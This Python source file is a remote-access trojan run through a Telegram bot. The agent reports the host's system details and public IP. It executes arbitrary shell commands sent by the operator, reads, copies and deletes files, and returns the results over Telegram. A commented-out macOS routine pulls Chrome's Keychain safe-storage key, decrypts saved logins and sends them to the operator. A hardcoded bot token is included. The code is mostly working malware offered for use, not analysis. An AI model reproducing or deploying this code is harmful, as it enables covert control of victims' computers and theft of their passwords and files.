## Todo: implement screenshot tool and chrome password dumper

import sys
import datetime
import time
import pprint
import subprocess, os
import getpass
import platform
import uuid
import socket
import requests
import shutil
import sqlite3
import binascii
import base64
import hashlib
import glob
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters
import telegram
import logging

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
                    level=logging.INFO)
logger = logging.getLogger(__name__)

def runShellCommand(command):
    proc = subprocess.Popen([command], stdout=subprocess.PIPE, shell=True) 
    (out, err) = proc.communicate() 
    if out:
        return out
    if err:
        return err

def shell(update, context):
    proc = subprocess.Popen([update.message.text], stdout=subprocess.PIPE, shell=True) 
    (out, err) = proc.communicate() 
    print("\n\ncommand recevied: %s\n\n" % update.message.text)
    print("out = %s" % out)
    context.bot.send_message(chat_id=update.effective_chat.id, text='''*root@telegram>*``` %s ``` ''' % out, parse_mode=telegram.ParseMode.MARKDOWN)


def error(update, context):
    """Log Errors caused by Updates."""
    logger.warning('Update "%s" caused error "%s"', update, context.error)



class Agent(object):
    
    ## Constructor set host and port variables
    def __init__(self):
        self.platform = platform.system() + " " + platform.release()
        self.hostname = socket.gethostname()
        self.username = getpass.getuser()
        self.publicIP = requests.get('https://api.ipify.org').text

    ## Sends info about current system to server
    def SystemInfo(self):
        return "# Platform: " + self.platform + "\n# Hostname: " + self.hostname + "\n# Username: " + self.username + "\n# IP Address: " + self.publicIP
    
    ## Change directory then send confirmation (cd)
    def ChangeDirectory(self, directory):
        try:
            os.chdir(directory)
            return "***DIRECTORY CHANGED***"
        except:
            return "***Error Changing Directory\nUseage: cd <directory to change to>***"
    ## Send directory listing (ls)
    def DirectoryList(self):
        directorylisting = os.listdir(os.getcwd())
        return directorylisting

    def CopyFiles(self, filetocopy, todir):
        try:
            shutil.copy2(os.path.expanduser(filetocopy), os.path.expanduser(todir))
            return "***Copied %s to %s***" % (os.path.expanduser(filetocopy) ,os.path.expanduser(todir))
        except:
            return "***Failed to Copy Usage: cp <file/path-to-file> <directory-to-copy-to>***"

    def MakeDirectory(self, directory):
        try:    
            os.mkdir(os.path.expanduser(directory))
            return "'" + directory + "'" + " created"
        except:
            return "***Usage: mkdir <directory>***"

    def RemoveFile(self, filetoremove):
        try:
            try:
                os.remove(os.path.expanduser(filetoremove))
                return "***Removed %s***" % filetoremove
            except:
                shutil.rmtree(os.path.expanduser(filetoremove))
                return "***Removed %s***" % filetoremove
        except:    
            return "***Error file doesnt exist***"

    def CatFile(self, filetocat):
        try:
            file = open(os.path.expanduser(filetocat), 'r')
            contents = str(file.read())
            return contents
        except:
            return "***Error opening file***"

    #def ZipFiles

    ## Send current user (whoami)
    def Whoami(self):
        return getpass.getuser()


    # def GetMacScreenshot(self, chatid):
    #     try:
    #         ##os.chdir(expanduser("~"))
    #         if os.path.exists(os.path.expanduser("~/.systemlibrary/")):
    #             timestamp = str(datetime.datetime.now())
    #             #filename = timestamp[21:] + ".png"
    #             filepath = os.path.expanduser("~/.systemlibrary/" + timestamp[21:] + ".png")
    #             os.system("screencapture " + filepath)
    #             BOT.sendPhoto(chat_id=chatid, photo=open(filepath, 'rb'))
    #             os.remove(filepath)
    #         else:
    #             os.mkdir(os.path.expanduser("~/.systemlibrary"))
    #             timestamp = str(datetime.datetime.now())
    #             #filename = timestamp[21:] + ".png"
    #             filepath = os.path.expanduser("~/.systemlibrary/" + timestamp[21:] + ".png")
    #             os.system("screencapture " + filepath)
    #             BOT.sendPhoto(chat_id=chatid, photo=open(filepath, 'rb'))
    #             os.remove(filepath)

    #     except:
    #         BOT.sendMessage(chatid, "Sorry no Screenshot taken or File Transfered")

    ## Start shell process
    def ExecuteShell(self, cmd):
        try:
            shell_execution = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output, error = shell_execution.communicate()
            if output:
                return output
            if error:
                return error
            else:
                return "No Output"
        except:
            return "Error: Shell command not executed. If your buffer is too big you will encounter this error -Telegram Devs" 

    
    
    
    ## Dump chrome passwords class (MAC)
# class DumpChromePasswordsMac(object):
#     def __init__(self):
#         self.loginData = glob.glob("%s/Library/Application Support/Google/Chrome/Profile*/Login Data" % os.path.expanduser("~"))
#         if len(self.loginData) == 0:
#             self.loginData = glob.glob("%s/Library/Application Support/Google/Chrome/Default/Login Data" % os.path.expanduser("~")) #attempt default profile
#         self.safeStorageKey = subprocess.check_output("security 2>&1 > /dev/null find-generic-password -ga 'Chrome' | awk '{print $2}'", shell=True).replace("\n", "").replace("\"", "")
#         if self.safeStorageKey == "":
#             print "ERROR getting Chrome Safe Storage Key"
#             sys.exit()

#     def ChromeDecrypt(self, encrypted_value, iv, key=None): #AES decryption using the PBKDF2 key and 16x ' ' IV, via openSSL (installed on OSX natively)
#         hexKey = binascii.hexlify(key)
#         hexEncPassword = base64.b64encode(encrypted_value[3:])
#         try: #send any error messages to /dev/null to prevent screen bloating up
#             decrypted = subprocess.check_output("openssl enc -base64 -d -aes-128-cbc -iv '%s' -K %s <<< %s 2>/dev/null" % (iv, hexKey, hexEncPassword), shell=True)
#         except Exception as e:
#             decrypted = "ERROR retrieving password"
#         return decrypted

#     def ChromeProcess(self, safeStorageKey, loginData):
#         iv = ''.join(('20',) * 16) #salt, iterations, iv, size - https://cs.chromium.org/chromium/src/components/os_crypt/os_crypt_mac.mm
#         key = hashlib.pbkdf2_hmac('sha1', safeStorageKey, b'saltysalt', 1003)[:16]
#         fd = os.open(loginData, os.O_RDONLY) #open as read only
#         database = sqlite3.connect('/dev/fd/%d' % fd)
#         os.close(fd)
#         sql = 'select username_value, password_value, origin_url from logins'
#         decryptedList = []
#         with database:
#             for user, encryptedPass, url in database.execute(sql):
#                 if user == "" or (encryptedPass[:3] != b'v10'): #user will be empty if they have selected "never" store password
#                     continue
#                 else:
#                     urlUserPassDecrypted = (url.encode('ascii', 'ignore'), user.encode('ascii', 'ignore'), self.ChromeDecrypt(encryptedPass, iv, key=key).encode('ascii', 'ignore'))
#                     decryptedList.append(urlUserPassDecrypted)
#         return decryptedList

#     def DumpChromePasswords(self, chat_id):
#         BOT.sendMessage(chat_id, "***[+] Dumping Passwords***", parse_mode= 'Markdown')
#         for profile in self.loginData:
#             for i, x in enumerate(self.ChromeProcess(self.safeStorageKey, "%s" % profile)):
#                 print "[%s] %s\n\tUser: %s\n\tPass: %s" % ((i + 1), x[0], x[1], x[2])
#                 BOT.sendMessage(chat_id, "```[+] %s\n\tUser: %s\n\tPass: %s```" % (x[0], x[1], x[2]), parse_mode= 'Markdown')




def handle(update, context):
    agent = Agent()
    command = update.message.text
    print command
    if command == 'kill' or command == 'die' or command == 'quit':
        context.bot.send_message(chat_id=update.effective_chat.id, text='''*root@telegram>*``` To kill agent run the command KILL-AGENT ``` ''', parse_mode=telegram.ParseMode.MARKDOWN)
    
    elif command == 'KILL-AGENT':
        context.bot.send_message(chat_id=update.effective_chat.id, text='''*root@telegram>*``` CYA FUCKERS! ``` ''', parse_mode=telegram.ParseMode.MARKDOWN)
        os.exit(SIGINT)
    
    elif command.split()[0] == 'cd':
        context.bot.send_message(chat_id=update.effective_chat.id, text='''*root@telegram>*``` %s ``` ''' % agent.ChangeDirectory(command.split()[1]), parse_mode=telegram.ParseMode.MARKDOWN)
    
    elif command[:2] == 'ls':
        if command[3:] == '-l':
            context.bot.send_message(chat_id=update.effective_chat.id, text='''*root@telegram>*``` %s ``` ''' % runShellCommand('ls -al'), parse_mode=telegram.ParseMode.MARKDOWN)
        else:
            context.bot.send_message(chat_id=update.effective_chat.id, text='''*root@telegram>*``` %s ``` ''' % agent.DirectoryList(), parse_mode=telegram.ParseMode.MARKDOWN)
    ## cp
    elif command.split()[0] == 'cp':
        context.bot.send_message(chat_id=update.effective_chat.id, text='''*root@telegram>*``` %s ``` ''' % agent.CopyFiles(command.split()[1], command.split()[2]), parse_mode=telegram.ParseMode.MARKDOWN)
    ## rm
    elif (command.split()[0] == "rm"):
        context.bot.send_message(chat_id=update.effective_chat.id, text='''*root@telegram>*``` %s ``` ''' % agent.RemoveFile(command.split()[1]), parse_mode=telegram.ParseMode.MARKDOWN)
    ## mkdir
    elif (command.split()[0] == "mkdir"):
        context.bot.send_message(chat_id=update.effective_chat.id, text='''*root@telegram>*``` %s ``` ''' % agent.MakeDirectory(command.split()[1]), parse_mode=telegram.ParseMode.MARKDOWN)
    ## pwd    
    elif (command.split()[0] == "pwd"):
        context.bot.send_message(chat_id=update.effective_chat.id, text='''*root@telegram>*``` %s ``` ''' % os.getcwd(), parse_mode=telegram.ParseMode.MARKDOWN)
    ## whoami
    elif (command.split()[0] == "whoami"):
        context.bot.send_message(chat_id=update.effective_chat.id, text='''*root@telegram>*``` %s ``` ''' % agent.Whoami(), parse_mode=telegram.ParseMode.MARKDOWN)
    ## hostname
    elif (command.split()[0] == "hostname"):
        context.bot.send_message(chat_id=update.effective_chat.id, text='''*root@telegram>*``` %s ``` ''' % agent.hostname, parse_mode=telegram.ParseMode.MARKDOWN)
    ## cat
    elif (command.split()[0] == "cat"):
        context.bot.send_message(chat_id=update.effective_chat.id, text='''*root@telegram>*``` %s ``` ''' % agent.CatFile(command.split()[1]), parse_mode=telegram.ParseMode.MARKDOWN)   
    ## screenshot
    elif (command.split()[0] == "screenshot"):
        context.bot.send_message(chat_id=update.effective_chat.id, text='''*root@telegram>*``` %s ``` ''' % 'No SCREENSHOTS yet this be a placeholder', parse_mode=telegram.ParseMode.MARKDOWN)
    elif (command.split()[0] == "sysinfo" or command.split()[0] == "info"):
	    context.bot.send_message(chat_id=update.effective_chat.id, text='''*root@telegram>*``` %s ``` ''' % agent.SystemInfo(), parse_mode=telegram.ParseMode.MARKDOWN)
    ## shell
    elif (command.split()[0] == "shell"):
        context.bot.send_message(chat_id=update.effective_chat.id, text='''*root@telegram>*``` %s ``` ''' % agent.ExecuteShell(command[6:]), parse_mode=telegram.ParseMode.MARKDOWN)
def main():
    """Start the bot."""
    # Create the Updater and pass it your bot's token.
    # Make sure to set use_context=True to use the new context based callbacks
    # Post version 12 this will no longer be necessary
    updater = Updater("907336935:AAEAOUEDYZUJG4TwuUfP-PJuqtBtH9Ckz24", use_context=True)

    # Get the dispatcher to register handlers
    dp = updater.dispatcher

    # on noncommand i.e message - echo the message on Telegram
    dp.add_handler(MessageHandler(Filters.text, handle))

    # log all errors
    dp.add_error_handler(error)

    # Start the Bot
    updater.start_polling()

    # Run the bot until you press Ctrl-C or the process receives SIGINT,
    # SIGTERM or SIGABRT. This should be used most of the time, since
    # start_polling() is non-blocking and will stop the bot gracefully.
    updater.idle()


if __name__ == '__main__':
    main()
